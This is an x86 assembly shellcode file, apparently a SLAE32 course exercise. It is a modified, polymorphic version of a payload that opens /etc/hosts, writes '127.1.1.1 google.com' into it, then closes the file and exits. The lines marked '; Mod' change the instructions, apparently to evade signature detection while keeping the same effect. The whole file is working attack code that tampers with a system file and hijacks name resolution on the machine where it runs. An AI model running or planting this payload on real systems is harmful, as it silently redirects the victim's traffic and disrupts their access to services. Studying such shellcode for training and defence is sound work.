; For SLAE32
; Howard McGreehan


global _start

section .text

_start:
    xor ecx, ecx
    mul ecx

    push eax
    mov al, 0x4     ; Modification

    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp

    inc ecx	; Mod
    push ecx	; Mod
    pop edi	; Mod
    mov ch, al	; Mod
    inc eax	; Mod
	
    int 0x80        ;syscall to open file

    mov ebx, eax	; Mod

    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    
    mov dl, len		; Mod

    int 0x80        ;syscall to write in the file

    sub edx, 0xE	; Mod
    mov eax, edx	; Mod

    int 0x80        ;syscall to close the file

    mov eax, edi	; Mod
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
    len: equ $-google
